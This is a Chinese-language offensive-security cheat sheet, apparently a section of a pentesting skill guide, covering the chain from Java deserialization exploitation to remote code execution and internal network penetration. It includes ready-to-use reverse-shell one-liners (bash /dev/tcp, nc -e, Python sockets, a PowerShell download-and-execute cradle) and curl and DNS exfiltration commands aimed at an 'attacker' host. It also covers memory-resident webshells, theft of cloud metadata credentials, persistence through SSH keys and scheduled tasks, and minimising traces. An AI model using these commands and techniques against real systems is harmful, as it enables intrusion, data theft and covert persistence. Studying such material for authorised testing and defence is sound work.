## 十四、反序列化→RCE→内网渗透完整链

### 14.1 完整攻击流程总览
```
阶段1 侦察：指纹识别（AC ED 00 05 / rO0AB / O:N: / \x80\x03 / @type）
阶段2 确认：URLDNS / DNSLog / sleep 延迟 无害探测（不触发 RCE）
阶段3 链选择：依赖探测（GadgetProbe/报错/依赖清单）→ 选链（CC6 盲打 / CB1 / JDK-only / 框架链）
阶段4 RCE：投递 payload → 验证命令执行（回显/外带/盲打）
阶段5 回显与持久：内存马 / WebShell / 计划任务 / SSH key
阶段6 内网：代理隧道 → 横向移动（RMI/JNDI/同构链复用）→ 域渗透
```

### 14.2 不出网利用与回显技术（重点）
```
无回显环境判定与应对：
1. 盲打判定：sleep 延时 / DNS 外带（nslookup $(whoami).attacker.com）/ HTTP 外带（curl http://attacker/$(id|base64)）
2. 回显实现路径：
   a. 模板引擎回显：freemarker/velocity/SPEL 表达式注入回显（Web 应用通用）
   b. 异常信息回显：恶意类构造器把命令结果写入异常 detailMessage（Fastjson Throwable 链经典做法）
   c. 内存马：Tomcat Filter/Listener/Servlet、Spring Controller、Jetty Handler（无文件落地、重启失效）
   d. 写文件回显：写入 Web 目录 JSP/PHP 马（依赖目录可写）
   e. 线程注入回显：Godzilla/Behinder 内存马线程，WebSocket 通道复用
3. 完全不出网时的武器：
   a. BCEL + BasicDataSource/UnpooledDataSource（JDK<8u251，tomcat-dbcp/ibatis 依赖）
   b. TemplatesImpl 直接字节码执行（需 parseObject + SupportNonPublicField 等触发条件）
   c. c3p0 WrapperConnectionPoolDataSource 二次反序列化（HexAsciiSerializedMap: 前缀）
   d. 文件写入链（Fastjson AutoCloseable/MySQL Connector，见 fastjson-exploitation 技能）
   e. URLClassLoader 从内网可达 HTTP 服务加载 jar
```

### 14.3 反弹 Shell / 外带命令速查
```bash
# 反弹 shell 多姿势
bash -i >& /dev/tcp/attacker/4444 0>&1
nc -e /bin/sh attacker 4444
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')"
# 外带数据（无回显时）
curl http://attacker/$(cat /etc/hostname)
nslookup $(whoami).attacker.dnslog.cn
ping -c 1 $(hostname).attacker.dnslog.cn
# 内网穿透（RCE 后）
# frp / ew / chisel / ligolo-ng：Socks5 代理进内网
```

### 14.4 横向移动与权限维持
```
- 同构复用：内网同版本中间件（WebLogic/JBoss/Jenkins）直接复用同一条链
- RMI/JNDI 横向：利用内网 RMI Registry 反序列化、JNDI 注入渗透其他服务
- 密钥/配置提取：读取环境变量、配置中心、云元数据（http://169.254.169.254/latest/meta-data/）
- 权限维持：SSH key / 计划任务 / WebShell（注意混淆与清理）/ 内存马（高隐蔽）
- 注意：一切操作留痕最小化，测试完成按授权范围清理
```

